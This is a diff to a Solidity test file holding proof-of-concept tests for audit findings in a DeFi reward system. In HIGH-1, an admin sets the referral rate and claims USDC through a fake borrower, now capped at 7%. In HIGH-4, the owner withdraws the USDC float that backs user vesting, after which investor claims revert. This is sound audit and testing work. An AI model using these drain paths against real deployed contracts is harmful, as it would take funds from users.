@@ -6,23 +6,21 @@ import "../Setup.sol";
 /// @notice PoC tests for critical/high severity vulnerabilities
 contract CriticalFindingsTest is Setup {
     // ═══════════════════════════════════════════════════════════════
-    //   HIGH-1: MANAGER PRIVILEGE ESCALATION → DRAIN REWARDSYSTEM
-    //   Any manager can set referralPercentage to 100%, create a
-    //   project, invest via an accomplice, and drain RewardSystem USDC.
+    //   HIGH-1: the admin prices an invite, creates a project on a
+    //   borrower of his own and claims the referral out of the reward
+    //   system. Bounded, not closed: the band now stops at 7%, so one
+    //   pass costs the attacker fifteen times the capital it returns.
     // ═══════════════════════════════════════════════════════════════
 
-    function test_HIGH1_managerDrainsRewardSystem() public {
-        // Step 1: Compromised manager sets referral to 100%
-        vm.prank(manager);
-        rewardSystem.setParameters(
-            1_000_000,  // referralPercentage = 100% (max allowed)
-            60_000,     // burnPercentage
-            60_000,     // tokenPercentage
-            30e6,       // welcomeBonus
-            1000e6,     // minInvestment
-            25_000,     // weeklyUnlock
-            40          // vestingWeeks
-        );
+    function test_HIGH1_referralCapBoundsTheDrain() public {
+        // Step 1: the admin reaches for 100% and is refused — the band stops at 7%.
+        vm.prank(admin);
+        vm.expectRevert("Referral percentage out of range");
+        rewardSystem.setParameters(1_000_000);
+
+        // What is left is the ceiling, and the rest of the path still works.
+        vm.prank(admin);
+        rewardSystem.setParameters(70_000); // 7%, the most the band allows
 
         // Step 2: Create project with fake borrower
         address fakeBorrower = makeAddr("fakeBorrower");
@@ -46,20 +44,18 @@ contract CriticalFindingsTest is Setup {
         // Step 4: Fund the project
         _fundProject(pid);
 
-        // Step 5: Attacker claims referral USDC from RewardSystem
-        // referralPercentage = 100% → attacker gets 50,000 USDC as referral
+        // Step 5: the referral still pays out of the reward system's own USDC — the path is open,
+        // only the rate is capped. 7% of 50k is 3.5k per pass instead of the whole 50k.
         (uint256 attackerUSDC,,,,) = rewardSystem.getProjectRewards(attacker, pid);
-
-        // CRITICAL: attacker gets 100% of investment amount as referral reward
-        assertEq(attackerUSDC, 50_000e6, "Attacker gets 100% referral");
+        assertEq(attackerUSDC, 3_500e6, "7% of the investment, not 100%");
 
         uint256 rewardBalanceBefore = usdc.balanceOf(address(rewardSystem));
         vm.prank(attacker);
         rewardSystem.claimUSDCForProject(pid);
         uint256 drained = rewardBalanceBefore - usdc.balanceOf(address(rewardSystem));
 
-        assertEq(drained, 50_000e6, "50K USDC drained from RewardSystem");
-        assertEq(usdc.balanceOf(attacker), 50_000e6, "Attacker received 50K USDC");
+        assertEq(drained, 3_500e6, "the cap bounds one pass to 7%");
+        assertEq(usdc.balanceOf(attacker), 3_500e6);
     }
 
     // ═══════════════════════════════════════════════════════════════
@@ -125,39 +121,39 @@ contract CriticalFindingsTest is Setup {
     }
 
     // ═══════════════════════════════════════════════════════════════
-    //   HIGH-4: OWNER CAN DRAIN REWARDSYSTEM VESTING TOKENS
-    //   Owner.withdraw() can pull tokens that users are vesting,
-    //   making their claims fail with "Not enough tokens to claim".
+    //   HIGH-4: OWNER CAN DRAIN WHAT USERS ARE VESTING
+    //   Vesting is paid in USDC, so the token balance no longer backs
+    //   it — but withdraw() reaches the USDC float the same way.
     // ═══════════════════════════════════════════════════════════════
 
-    function test_HIGH4_ownerDrainsVestingTokens() public {
+    function test_HIGH4_ownerDrainsVestingFloat() public {
         // Create vesting in Rewards2
         address[] memory users = new address[](1);
         users[0] = investor;
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 10_000e18;
 
-        vm.prank(owner);
-        token.mint(address(rewards2), 10_000e18);
+        vm.prank(admin);
+        rewards2.setRedemptionRate(20_000);
 
-        vm.prank(owner);
-        rewards2.createVesting(users, amounts);
+        vm.startPrank(owner);
+        rewards2.seedVestings(users, amounts);
+        usdc.mint(address(rewards2), 200e6);
+        vm.stopPrank();
 
         // Warp 41 weeks — fully vested
         vm.warp(block.timestamp + 41 weeks);
 
-        // Owner drains tokens meant for vesting
+        // Owner drains the USDC the vesting is paid out of
         vm.prank(owner);
-        token.enableBuying(); // needed for transfer to work
-        vm.prank(owner);
-        rewards2.withdraw(address(token), 10_000e18, attacker);
+        rewards2.withdraw(address(usdc), 200e6, attacker);
 
-        assertEq(token.balanceOf(attacker), 10_000e18, "Attacker got vesting tokens");
+        assertEq(usdc.balanceOf(attacker), 200e6, "Attacker got the vesting float");
 
         // Investor tries to claim — fails
         vm.prank(investor);
-        vm.expectRevert("Not enough tokens to claim");
-        rewards2.claim();
+        vm.expectRevert("Not enough USDC to claim");
+        rewards2.claimUsdc();
     }
 
     // ═══════════════════════════════════════════════════════════════
